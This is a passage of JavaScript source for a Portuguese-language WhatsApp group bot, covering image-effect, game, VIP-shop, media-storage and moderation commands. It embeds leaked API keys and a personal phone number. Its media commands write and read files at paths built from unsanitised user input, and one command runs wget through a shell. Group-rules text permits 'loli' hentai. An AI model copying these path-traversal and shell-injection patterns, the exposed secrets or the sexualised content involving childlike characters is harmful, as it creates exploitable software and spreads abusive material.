					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210222_040232.png?text.0.text=${query}&text.0.position.gravity=northwest&text.0.position.x=10%25&text.0.position.y=8%25&text.0.align=right&text.0.size=55&text.0.color=000000&text.0.opacity=72&text.0.font.family=Bitter&text.0.font.style=italic`)
					loli.sendMessage(from, buffer, image, {quoted: say1, thumbnail: null})
					break
// Textprome //
                case 'blackpink':
                case 'neon':
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
                if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} Hori`)
                    reply(mess.wait)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/${command}?apikey=ChOkYbOT8&text=${ini_txt}`)
                    loli.sendMessage(from, ini_buffer, image, { quoted: mek, thumbnail:null})
                    break
                    case 'wasted':
                               if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
				reply(mess.wait)
                    ini_url = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/editor/wasted?apikey=ChOkYbOT8&img=${ini_url}`)
                    await loli.sendMessage(from, ini_buffer, image, { quoted: say1 })
                    break
                case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} Hori`)
                    reply(mess.wait)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome2/${command}?apikey=ChOkYbOT8&text1=${txt1}&text2=${txt2}`)
                    loli.sendMessage(from, ini_buffer, image, { quoted: mek, thumbnail:null})
                    break
case 'anagrama':
if(!isGroup) return reply('comando apenas para grupos')
const anaaleatorio = Math.floor(Math.random() * palavrasANA.length)
if (!isOwner) return reply('somente meu criador')
if(args.length < 1) return reply('use 1 para ativar o jogo do anagrama\npara desativar use anagrama 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./src/anagrama-${from}.json`)) {
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./src/anagrama-${from}.json`))
reply(`o jogo já foi iniciado neste grupo:
palavra: ${dataAnagrama2.embaralhada}
dica: ${dataAnagrama2.dica}
`)} else {
fs.writeFileSync(`./src/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[anaaleatorio])}`)
loli.sendMessage(from, `
╭─────≽「 👾 ANAGRAMA 👾 」
│➽ DESCUBRA A PALAVRA
│➽ ANAGRAMA: ${palavrasANA[anaaleatorio].embaralhada}
│➽ DICA: ${palavrasANA[anaaleatorio].dica}
╰────────────────────────
`,MessageType.text)
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./src/anagrama-${from}.json`)) return reply('não tem como desativar o jogo do anagrama pôs ele não foi ativado')
fs.unlinkSync(`./src/anagrama-${from}.json`)
reply("desativado com sucesso")
}
break
case 'anticatalogo':
case 'catálogo':
case 'catalogo':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiCatalogo) return reply('Já está ativo!')
anticatalogo.push(from)
fs.writeFileSync('./database/json/anticatalogo.json', JSON.stringify(anticatalogo))
reply('aтινσυ cσм ѕυcєѕѕσ σ яєcυяѕσ αηтι-cαтάℓσgσ ηєѕтє gяυρσ ✔️')
} else if (Number(args[0]) === 0) {
let position = false
Object.keys(anticatalogo).forEach((i) => {
if (anticatalogo[i] === from) {
position = i
}
})
if (position !== false) {
anticatalogo.splice(position, 1)}
fs.writeFileSync('./database/json/anticatalogo.json', JSON.stringify(anticatalogo))
reply('Ɗєѕαтινσυ cσм ѕυcєѕѕσ σ αηтι-cαтάℓσgσ ηєѕтє gяυρσ ✔️')
} else {
reply('1🇦​🇹​🇮​🇻​🇦​ 0🇩​🇪​🇸​🇦​🇹​🇮​🇻​🇦​')
}
break

                    // Photo Oxy //

                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
                if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} Hori`)
                    reply(mess.wait)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/${command}?apikey=ChOkYbOT8&text=${ini_txt}`)
                    loli.sendMessage(from, ini_buffer, image, { quoted: mek, thumbnail:null})
                    break
				case 'tapa2':
				try {
				addFilter(from)
				if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
				if (!isGroup) return reply(ind.groupo())
                var imgbb = require('imgbb-uploader')
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Em quem você quer dar o tapa na cara >:] ?')
				mentidn = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
				reply('Calma,esquenta a mão ae')
                ghost = mek.participant
                try {
                pp = await loli.getProfilePicture(ghost)
                } catch {
                pp = 'https://i.ibb.co/64dN6bQ/imgbb-20201220-WA0024.jpg'
                }
                media = await getBuffer(pp)
                datae = await imageToBase64(JSON.stringify(pp).replace(/\"/gi, ''))
                fs.writeFileSync('tapa.jpeg', datae, 'base64')
                res = await imgbb(`${apikeyG}`, 'tapa.jpeg')
                userf1 = `${res.display_url}`
                try {
				ppp = await loli.getProfilePicture(`${mentidn.split('@')[0]}@s.whatsapp.net`)
				} catch {
				ppp = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
                media = await getBuffer(ppp)
                data2e = await imageToBase64(JSON.stringify(ppp).replace(/\"/gi, ''))
                fs.writeFileSync('tapa2.jpeg', data2e, 'base64')
                res2 = await imgbb(`${apikeyG}`, 'tapa2.jpeg')
                userf2 = `${res2.display_url}`
                buffer99 = await getBuffer(`https://api.lolhuman.xyz/api/creator2/slap?apikey=ChOkYbOT8&img1=${userf1}&img2=${userf2}`)
                loli.sendMessage(from, buffer99, image, {quoted: mek, thumbnail:null, caption: `Você deu tapa no(a) @${mentidn.split('@')[0]}`, contextInfo: {mentionedJid: [mentidn]}})
                } catch (e) {
                console.log(`Error :`, color(e,'red'))
                reply("Api está passando por uma análise! Espera ate que ela volte ao normal. ou veja se tem foto de perfil publica vc e o indivíduo")
                }
				break
				case 'tagimg':
				if (!isRegistered) return reply(ptbr.rg(prefix, pushname))//PEDI O REGISTRO
				if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await loli.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
                        var value = args.join(" ")
                        var group = await loli.groupMetadata(from)
                        var member = group['participants']
                        var mem = []
                        member.map(async adm => {
                            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                        })
                        var options = {
                            contextInfo: { mentionedJid: mem },
                            quoted: mek
                        }
                        ini_buffer = fs.readFileSync(filePath)
                        loli.sendMessage(from, ini_buffer, image, options)
                        fs.unlinkSync(filePath)
                    } else {
                        reply(`Tag de imagem foi enviada`)
                    }
                    break
                    case 'tagsticker':
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))//PEDI O REGISTRO
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isvipp) return reply(mess.only.premium)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await loli.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await loli.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            loli.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*[❗] MARQUE A FIGURINHA 😐*`)
            }
            break
				case 'buyvip':						
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))//PEDI O REGISTRO
if (vipp.includes(sender)) return reply("❌ Só pode comprar VIP uma vez! ❌")
    payout2 = 1
				const koinPerlimit2 = 5000000 //QUANTIDADE DO PREMIUM
				const total3 = koinPerlimit2 * payout2
				const nrolxp1 = Number(-5000000)
				if ( checkATMuser(sender) <= total3) return reply(`[❗] Desculpe ${pushname} você não tem dinheiro suficiente\nvalor do VIP : ${koinPerlimit2} milhão`)
				if ( checkATMuser(sender) >= total3) {
					confirmATM(sender, total3)
					addKoinUser(sender, nrolxp1)
				vipp.push(`${sender.split('@')[0]}@s.whatsapp.net`)
					fs.writeFileSync('./database/vip.json', JSON.stringify(vipp))
					await reply(`👸COMPRA BEM SUCEDIDA👸\n\nObrigado por comprar o vip ${pushname}\n*preço do vip* : ${koinPerlimit2}\n*o resto do seu dinheiro* : ${checkATMuser(sender)}💵\n\n*compra bem sucedida com o id :* \n*💳: ${createSerial(15)}*`)				
					}
				break

case 'buymoney':{
               addFilter(from)
         if (!isGroup) return reply(mess.only.group)                                                     
          if (!isPetualang) return reply(`Desculpe onii-chan parece que você não é um aventureiro!!\nPara ser um aventureiro digite :\n${prefix}joinrpg`)  
          payout2 = 1
          const ane = 50000 * payout2
          const nrolxp1 = Number(100000) 
          if (getBalance(sender, balance) < ane) return reply(`Seu saldo não é suficiente para esta compra\n\Valor Do pacote 50k de Cash = 100k de dinheiro principal do bot`)
          kurangBalance(sender, ane, balance)
          addKoinUser(sender, nrolxp1)
          await reply(`👸COMPRA BEM SUCEDIDA👸\n\nObrigado por comprar\nSaldo Restante do Cash :  $${(getBalance(sender, balance))}\nSeu Dinheiro ${checkATMuser(sender)}💵\n\n*compra bem sucedida com o id :* \n*💳: ${createSerial(15)}* `)
          }
          break 

 case 'buylimite':{

               addFilter(from)
         if (!isGroup) return reply(mess.only.group)                                                     
          if (!isPetualang) return reply(`Desculpe onii-chan parece que você não é um aventureiro!!\nPara ser um aventureiro digite :\n${prefix}joinrpg`)  
          if (args.length < 1) return reply(`Envie o pedido *${prefix}buylimite* valor limite que você deseja comprar\n\nPreço 1 limite = $1000 cash`)   
           if (isNaN(args[0])) return reply('CUIDADO USE DA FORMA CORRETA OU PODE PERDER TODA A QUANTIA')   
          payout = args.join(" ")
          let ane = 1000 * payout
          if (getBalance(sender, balance) < ane) return reply(`Seu saldo não é suficiente para esta compra`)
          kurangBalance(sender, ane, balance)
          giveLimit(sender, parseInt(args[0]), limit)
          reply(monospace(`👸COMPRA BEM SUCEDIDA👸\n\nObrigado por comprar\nLimite de compra até ${args[0]} bem-sucedido\n\nSaldo restante :  $${(getBalance(sender, balance))}\n*compra bem sucedida com o id :* \n*💳: ${createSerial(15)}* `))
          }
          break 


				case 'loja':            				
				try {
			if (!isRegistered) return reply(ptbr.rg(prefix, pushname))//PEDI O REGISTRO
				ppimg = await loli.getProfilePicture(`${sender.split('@')[0]}@c.us`)
			} catch {
				ppimg = './src/200.jpg' //ARRUMADO
			}
	 		const dinhero = checkATMuser(sender)
				const loja = 
`
╭━─━─━「 LOJA 」
╿ *${prefix}buyvip*
╿libera o recurso VIP 
╿VALOR : 5,000.000 💰
╰━─━─━─━─━─━─━─━─━─┈┈=
`
loli.sendMessage(from, loja, text, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `Seu saldo e de ${dinhero}💰`, 'jpegThumbnail': fs.readFileSync('database/help/menu.jpg')}}}})					
          
break
case 'menuvip':
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     loli.updatePresence(from, Presence.composing)
                    tod = await getBuffer(`https://pm1.narvii.com/6905/90776726bfaae6c8b3d0d597f7bb08f0c4e9fedbr1-736-519v2_hq.jpg`)
                    loli.sendMessage(from, tod, image, { quoted: say1, thumbnail:null, caption: `

╭━─━─━─━─━─━─━─━─━─━─━┈┈=
╿  💎 _*VIP MENU*_ 💎
╘┬─━─━─━─━─━─━─━─━─━─━=
┌┤ 
╿╿💶 *${prefix}tagsticker*
╿╿💶 *${prefix}tagimg*
╿╿💶 *${prefix}hidetag*
╿╿💶 *${prefix}qrcode*
╿╿💶 *${prefix}nhentaicod*
╿╿💶 *${prefix}packs*
╿╿💶 *${prefix}fotos*
╿╿💶 *${prefix}buypack*
╿╰─━─━─━─━─━─━─━─━─━─━┈┈=
╿ _Comandos para marcação etc.._
╰━─━─━─━─━─━─━─━─━─━─━┈┈=
╭━─━─━─━─━─━─━─━─━─━─━┈┈=
╿  🔴  _*ATTPS*_  🔵
╘┬─━─━─━─━─━─━─━─━─━─━=
┌┤ 
╿╿💶 *${prefix}attp1*
╿╿💶 *${prefix}attp2*
╿╿💶 *${prefix}attp3*
╿╿💶 *${prefix}attp4*
╿╿💶 *${prefix}attp5*
╿╿💶 *${prefix}attp6*
╿╰─━─━─━─━─━─━─━─━─━─━┈┈=
╿ _Use ${prefix}attp1,2,3..  + texto_
╿ _Ex ${prefix}attp Henplay domina_
╰━─━─━─━─━─━─━─━─━─━─━┈┈=
╭━─━─━─━─━─━─━─━─━─━─━┈┈=
╿   _*AUDIO*_ 🔈🔉🔊
╘┬─━─━─━─━─━─━─━─━─━─━=
┌┤ 
╿╿💶 *${prefix}nightcore*
╿╿💶 *${prefix}slow*
╿╿💶 *${prefix}esquilo*
╿╿💶 *${prefix}estourar*
╿╿💶 *${prefix}gemuk*
╿╿💶 *${prefix}fast*
╿╿💶 *${prefix}bass*
╿╰─━─━─━─━─━─━─━─━─━─━┈┈=
╿ _Marque um áudio com o comando_
╰━─━─━─━─━─━─━─━─━─━─━┈┈=
╭━─━─━─━─━─━─━─━─━─━─━┈┈=
╿  ⏯️ _*VIDEO MAKER*_ ⏯️
╘┬─━─━─━─━─━─━─━─━─━─━=
┌┤ 
╿╿💶 *${prefix}reversevid*
╿╿💶 *${prefix}fastvid*
╿╿💶 *${prefix}slowvid*
╿╰─━─━─━─━─━─━─━─━─━─━┈┈=
╿  _Junte 5,000,000 dinheiro ${prefix}dinheiro_ 
╿  _use ${prefix}buyvip dps de juntar o dinheiro_ 
╿            🤖「𝗛𝗢𝗥𝗜 𝗕𝗢𝗧」🤖
╰━─━─━─━─━─━─━─━─━─━─━┈┈= ` })
break
case 'autoreply':
					try {
						 addFilter(from)
						if (!isGroup) return reply(mess.only.group)
						if (!isGroupAdmins) return reply(mess.only.admin)
						if (args.length < 1) return reply('Hmmmm')
						if (Number(args[0]) === 1) {
							if (isAutoReply) return reply('Ja esta ativo')
							autoreply.push(from)
							fs.writeFileSync('./database/json/autoreply.json', JSON.stringify(autoreply))
							reply('Ativou com sucesso o recurso de auto respostas neste grupo')
						} else if (Number(args[0]) === 0) {
							autoreply.splice(from, 1)
							fs.writeFileSync('./database/json/autoreply.json', JSON.stringify(autoreply))
							reply('Desativou com sucesso o recurso de auto respostas neste grupo')
						} else {
							reply('1 para ativar, 0 para desativar')
						}
					} catch {
						reply('Deu erro, tente novamente :/')
					}
					break
					case 'antiloc':
					try {
						if (!isGroup) return reply(mess.only.group)
						if (!isGroupAdmins) return reply(mess.only.admin)
						if (!isBotGroupAdmins) return reply(mess.only.Badmin)
						if (args.length < 1) return reply('Hmmmm')
						if (Number(args[0]) === 1) {
							if (isAntiLoc) return reply('Ja esta ativo')
							antiloc.push(from)
							fs.writeFileSync('./src/antiloc.json', JSON.stringify(antiloc))
							reply('Ativou com sucesso o recurso de anti localização neste grupo')
						} else if (Number(args[0]) === 0) {
							antiloc.splice(from, 1)
							fs.writeFileSync('./src/antiloc.json', JSON.stringify(antiloc))
							reply('Desativou com sucesso o recurso de anti localização neste grupo')
						} else {
							reply('1 para ativar, 0 para desativar')
						}
					} catch {
						reply('Deu erro, tente novamente :/')
					}
					break
					case 'antidoc':
					try {
						if (!isGroup) return reply(mess.only.group)
						if (!isGroupAdmins) return reply(mess.only.admin)
						if (!isBotGroupAdmins) return reply(mess.only.Badmin)
						if (args.length < 1) return reply('Hmmmm')
						if (Number(args[0]) === 1) {
							if (isAntiDoc) return reply('Ja esta ativo')
							antidoc.push(from)
							fs.writeFileSync('./src/antidoc.json', JSON.stringify(antidoc))
							reply('Ativou com sucesso o recurso de anti documento neste grupo')
						} else if (Number(args[0]) === 0) {
							antidoc.splice(from, 1)
							fs.writeFileSync('./src/antidoc.json', JSON.stringify(antidoc))
							reply('Desativou com sucesso o recurso de anti documento neste grupo')
						} else {
							reply('1 para ativar, 0 para desativar')
						}
					} catch {
						reply('Falha')
					}
					break
					case 'katana':  
					if (!isOwner) return  reply('sai fedido, apenas o zadik tem esse poder')
                                        if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if(!isGroup) return reply(mess.only.group)
					if(groupIdscount.indexOf(from) >= 0) {
						var ind = groupIdscount.indexOf(from)
						for(let obj of groupMembers) {
							if(numbersIds.indexOf(obj.jid) >=0) {
								var indnum = numbersIds.indexOf(obj.jid)
								if(countMessage[ind].numbers[indnum].messages <= args[0]) {
									if(groupAdmins.includes(obj.jid)) {
										mentions(`@${obj.jid} é admin, logo não será banido por mandar pouca msg`, [obj.jid], true)
									} else {
										loli.groupRemove(from, [obj.jid])
									}
								}
							} else {
								if(groupAdmins.includes(obj.jid)) {
									mentions(`@${obj.jid} é admin, logo não será banido por mandar pouca msg`, [obj.jid], true)
								} else {
									loli.groupRemove(from, [obj.jid])
								}
							}
						}
					}
					break
					case 'antipv':
					try {
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isAntiPv) return reply('Ja esta ativo')
						antipv.push('Ativado')
						fs.writeFileSync('./src/antipv.json', JSON.stringify(antipv))
						reply('Ativou com sucesso o recurso de antipv no bot')
					} else if (Number(args[0]) === 0) {
						fs.writeFileSync('./src/antipv.json', JSON.stringify([]))
						reply('Desativou com sucesso o recurso de antipv no bot')
					} else {
						reply('1 para ativar, 0 para desativar')
					}
					} catch {
						reply('Error')
					}
                break  
                
					case 'regras':
					addFilter(from)
					if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
					loli.updatePresence(from, Presence.composing)
                    tod = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3ZzIMqwKi5DtBu8u7aCmV6Ra585_hdvx_1noOMsBPYMup-OPWSDUZ908S&s=10`)
                    loli.sendMessage(from, tod, image, {quoted: say1, thumbnail:null, caption: `_*BEM VINDO AO ${groupName}*_

DIVIRTA-SE, *DENTRO DAS NOSSAS LEIS* 🦘

existem 3 tipos de regras, vou dar uma explicada nelas

❎ regras verdes, penalidades menores, você tomará avisos ou até mesmo banimento temporário
❌ *regras vermelhas, penalidades médias, são regras bem específicas com direito a ban permanente*
✡️ _regras roxas, são penalidades especiais, meio q essas dependem do humor do adm, ele decidirá sua punição, então é melhor ter cuidado_

▬▬▬▬▬▬▬▬▬▬୧✬҉୨▬▬▬▬▬▬▬▬▬▬

_*AGORA VAMOS PARA AS REGRAS!*_

▬▬▬▬▬✅REGRAS VERDES✅▬▬▬▬▬▬

❌gadiar (a menos q seja mútuo e que não transforme o grupo num Tinder)
❌flood/corrente (figu max 6)
❌tretar (so com autorização dos adm)
❌encher o saco dos membros, aq é pra ser legal porra
❌pedir conteúdo

▬▬▬▬🚫REGRAS VERMELHAS🚫▬▬▬▬▬
❌link
❌travas
❌reclamar dos conteúdos (todos estão explicados a baixo, não queremos reclamações)
❌qualquer preconceito, aq é uma zona neutra na internet, sem preconceito ou associações
❌invadir pv
❌qualquer tipo de divulgação

▬▬▬▬▬✡️REGRAS ROXAS✡️▬▬▬▬▬▬
❌questionar as regras (isso é uma ditadura) 
❌mandar áudio gritando ou estourado (áudios externos, não gravados com seu microfone, é até tolerável)

só pra deixarmos claro, todos vamos listar todos os conteúdos aqui:

fotos, gifs e vídeos: 
✔️hentai
✔️loli (dependendo da aparência, será obrigatório apagar)
✔️cosplay de anime (lembrando que cosplay é pornografia comum, porém com intenção de parecer hentai/fantasias comuns não são cosplays de anime)
❌nudes
❌pornografia comum
❌cp 
❌gore
❌scat
❌toodlercoon

figurinhas:
✔️hentai
❌pornografia comum (pode bunda e peito real, nada de genitais)

 ⭐👸Rҽɠɾαʂ ԃσ ɠɾυρσ👸⭐`})
 break
				case 'admins':
					if (!isGroup) return reply(mess.only.group)
					teks = `Lista de admins do grupo *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
				case 'zadik':
                                        bufferv = fs.readFileSync('./src/zadikintro.mp4')
					loli.sendMessage(from, bufferv, video, {mimetype: 'video/mp4', quoted: horivid })
					buffer = await getBuffer(`https://i.imgur.com/r331jq8.jpg`)
					loli.sendMessage(from, buffer, image, {mimetype: 'image/jpeg', text,contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `*_© zadik_*` ,
"body": "🎉🎊🎉Clique Aqui🎉🎊🎉",
"previewType": "PHOTO",
"thumbnailUrl": "https://ibb.co/RQz34Hh",
"thumbnail": img2,
"sourceUrl": "https://api.whatsapp.com/send?phone=5521971702453&text=zadik,come%20minha%20bucetinha??%F0%9F%A5%B5%F0%9F%A5%B5"
},mentionedJid:[sender]}, quoted : mek, thumbnail:null, caption:  '*CRIADOR:*𝙯𝙖𝙙𝙞𝙠*\n\n*WPP:* wa.me/+5521971702453\n\nEspero que goste do bot hentaizero ou otaku😘*'})
					break
					case 'infogc':
				loli.updatePresence(from, Presence.composing)
				if (!isGroup) return reply(mess.only.group)
					try {
					ppimg = await loli.getProfilePicture(from)
				} catch {
					ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
				}
					let buf = await getBuffer(ppimg)
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `*Nome do grupo :* ${groupName}\n*Descrição :* ${groupDesc}\n*Número de Administradores :* ${groupAdmins.length}\n*Número de membros :* ${groupMembers.length}`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}]`
					}
					loli.sendMessage(from, buf, image, {quoted: mek, thumbnail:null, caption: teks})
					break
					case 'addaud':

					if (!isQuotedAudio) return reply('Marque o áudio e coloque o nome dele!')
					if (!q) return reply('Qual é o nome do áudio??')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await loli.downloadMediaMessage(boij)
					audionye.push(`${q}`)
					fs.writeFileSync(`./strg/audio/${q}.mp3`, delb)
					fs.writeFileSync('./strg/audio.json', JSON.stringify(audionye))
					loli.sendMessage(from, `Adicionado Audio com Sucesso\nVerifique por meio de ${prefix} listaud`, MessageType.text, { quoted: mek })
					break
				case 'getaud':

					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/audio/${q}.mp3`)
					loli.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: horiaud, ptt:true })
					break
				case 'listaud':
				case 'audlist':

					teks = '*Lista de áudios:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*`
					loli.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break
					case 'addimagem':

					if (!isQuotedImage) return reply('Marque a imagem e digita o nome!')
					svst = body.slice(10)
					if (!svst) return reply('Qual é o nome da imagem?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await loli.downloadMediaMessage(boij)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./strg/image/${svst}.jpeg`, delb)
					fs.writeFileSync('./strg/image.json', JSON.stringify(imagenye))
					loli.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listimage`, MessageType.text, { quoted: mek })
					break
				case 'getimagem':

					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/image/${namastc}.jpeg`)
					loli.sendMessage(from, buffer, image, { quoted: mek, caption: `Result From Database : ${namastc}.jpeg` })
					break
				case 'imagemlist':
				case 'listimagem':

					teks = '*Lista Imagens:*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*`
					loli.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
				case 'addvideo':

					if (!isQuotedVideo) return reply('Marque o vídeo e digite o nome!')
					svst = body.slice(10)
					if (!svst) return reply('Qual é o nome do vídeo?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await loli.downloadMediaMessage(boij)
					videonye.push(`${svst}`)
					fs.writeFileSync(`./strg/video/${svst}.mp4`, delb)
					fs.writeFileSync('./strg/video.json', JSON.stringify(videonye))
					loli.sendMessage(from, `Adicionado Video com Sucesso\nVerifique por meio de ${prefix} listvideo`, MessageType.text, { quoted: mek })
					break
				case 'getvideo':

					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/video/${namastc}.mp4`)
					loli.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: horivid })
					break
				case 'listvideo':
				case 'videolist':

					teks = '*Lista de Videos :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}*`
					loli.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": videonye } })
					break
						case 'getsticker':
				case 'gets':
					namastc = body.slice(12)
					result = fs.readFileSync(`./strg/sticker/${namastc}.webp`)
					loli.sendMessage(from, result, sticker, {quoted :mek})
					break
				case 'stickerlist':
				case 'liststicker':
					teks = '*Lista de Figurinhas :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*`
					loli.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
				case 'addsticker':
					if (!isQuotedSticker) return reply('Marque o sticker pfv')
					svst = body.slice(12)
					if (!svst) return reply('Qual é o nome do adesivo?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await loli.downloadMediaMessage(boij)
					setiker.push(`${svst}`)
					fs.writeFileSync(`./strg/sticker/${svst}.webp`, delb)
					fs.writeFileSync(`./strg/stik.json`, JSON.stringify(setiker))
					loli.sendMessage(from, `Adicionando adesivo com sucesso\nVerificar pelo caminho ${prefix}liststicker`, MessageType.text, { quoted: mek })
					break
                    case 'triggered':
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           reply(mess.wait)
         owgi = await loli.downloadAndSaveMediaMessage(ger)
           anu = await imgbb("941644256336912a1409c0bcfce50071", owgi)
        imgtrg = `${anu.display_url}`
         ranp = getRandom('.gif')
        rano = getRandom('.webp')
        anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${imgtrg}`
       exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                                                fs.unlinkSync(ranp)
                                                if (err) return reply(mess.error.stick)
                                                nobg = fs.readFileSync(rano)
